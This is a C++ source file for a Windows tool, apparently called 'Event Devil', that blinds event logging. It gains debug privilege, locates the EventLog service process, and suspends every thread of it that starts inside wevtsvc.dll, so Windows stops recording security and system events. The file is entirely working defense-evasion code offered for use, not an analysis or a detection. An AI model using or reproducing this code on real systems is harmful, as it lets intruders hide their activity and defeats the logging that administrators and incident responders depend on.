#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include "priv.h"
#include "tagqueries.h"
#include "handles.h"
#define ENABLE 1
#define DISABLE 0

int main()
{

	std::cout << R"(
                                                                                                                                         
 _______  __   __  _______  __    _  _______    ______   _______  __   __  ___   ___     
|       ||  | |  ||       ||  |  | ||       |  |      | |       ||  | |  ||   | |   |    
|    ___||  |_|  ||    ___||   |_| ||_     _|  |  _    ||    ___||  |_|  ||   | |   |    
|   |___ |       ||   |___ |       |  |   |    | | |   ||   |___ |       ||   | |   |    
|    ___||       ||    ___||  _    |  |   |    | |_|   ||    ___||       ||   | |   |___ 
|   |___  |     | |   |___ | | |   |  |   |    |       ||   |___  |     | |   | |       |
|_______|  |___|  |_______||_|  |__|  |___|    |______| |_______|  |___|  |___| |_______|

Mert Das @merterpreter
Mert Umut @whoismept
)" << '\n';


	NtQueryInformationThreadx NtQueryInformationThread = (NtQueryInformationThreadx)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		return -1;
	}
	//https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera
	SC_HANDLE scHnd = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svcHnd = OpenServiceA(scHnd, "EventLog", MAXIMUM_ALLOWED);

	SERVICE_STATUS_PROCESS serviceStatusProcess = {};

	//https://stackoverflow.com/questions/23622101/check-for-a-state-of-a-service-in-windows-using-c-via-windows-api-function

	QueryServiceStatusEx(svcHnd, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStat, sizeof(svcStat), &bytesNeeded);
	DWORD svcPID = svcStat.dwProcessId;
	printf("Svchost Eventlog PID: %d\n", svcPID);

	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, svcPID);
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	//https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
	hSvcProc = OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL)
		return -1;

	//https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules

	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &sizeNeeded);
	mCountr = sizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < mCountr; i++)
	{
		serviceModule = modules[i];
		GetModuleBaseName(serviceProcessHandle, serviceModule, rModule, sizeof(rModule));

		if (wcscmp(rModule, L"wevtsvc.dll") == 0)
		{
			GetModuleInformation(serviceProcessHandle, serviceModule, &moduleInfo, sizeof(MODULEINFO));
		}
	}

	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == svcPID)
		{
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);

			if (threadStartAddress >= (DWORD_PTR)moduleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)moduleInfo.lpBaseOfDll + moduleInfo.SizeOfImage)
			{
				Sleep(3000);
				printf("Killing EventLog thread %d \n", threadEntry.th32ThreadID);

				SuspendThread(threadHandle);
			}
		}
	}

	return 0;
}